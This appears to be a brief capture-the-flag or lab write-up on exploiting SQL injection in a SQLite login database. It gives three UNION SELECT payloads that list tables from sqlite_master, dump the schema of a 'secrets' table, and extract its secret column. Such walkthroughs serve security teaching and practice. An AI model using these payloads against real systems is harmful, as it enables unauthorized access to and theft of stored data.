There's an additional table in the login database called secrets

&nbsp;

We can leak this by looking at the table schema, (this shows the table secrets)
`" UNION SELECT tbl_name, 1 FROM sqlite_master --`

&nbsp;

With the table name, we can leak the schema from the table (e.g. it's columns) and see there's a "secret" column
`" UNION SELECT sql, 1 FROM sqlite_master WHERE tbl_name = "secrets" --`

&nbsp;

Now we just leak the secret from the table
`" UNION SELECT secret, 1 FROM secrets --`

